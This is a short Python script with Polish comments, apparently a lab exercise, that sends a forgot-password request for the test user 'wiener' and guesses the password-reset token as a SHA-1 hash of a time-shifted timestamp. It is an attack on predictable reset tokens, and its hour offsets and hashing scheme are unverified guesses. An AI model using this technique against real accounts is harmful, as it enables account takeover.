import sys
import requests
import re
import time
import hashlib
from datetime import datetime, timedelta

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    forgot_url = burp_url + '/forgot-password'

    session = requests.Session()

    # Pobierz token CSRF
    response = session.get(forgot_url)
    csrf_token = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)

    username = "wiener"
    data = {
        "csrf": csrf_token,
        "username": username
    }

    # Dodaj lub odejmij godzinę od bieżącego czasu
    current_time = datetime.now()
    time_with_hour_added = current_time + timedelta(hours=2)  # Dodanie godziny
    time_with_hour_subtracted = current_time - timedelta(hours=1)  # Odejmowanie godziny

    # Użyj czasu dodanego lub odjętego do generacji tokena
    time_seed = time_with_hour_added.timestamp()  # lub time_with_hour_subtracted.timestamp()
    
    response = session.post(forgot_url, data=data)
    print(f"Elapsed time of request: {response.elapsed.total_seconds()}")
    print(f"Sending reset request for {username} at time: {time_seed}")

    potential_token = hashlib.sha1(f"{int(time_seed)}".encode()).hexdigest()
    print(f"Potential token: {potential_token}")

    if "Please check your email for a reset password link." in response.text:
        print(f"Reset request sent for {username}")
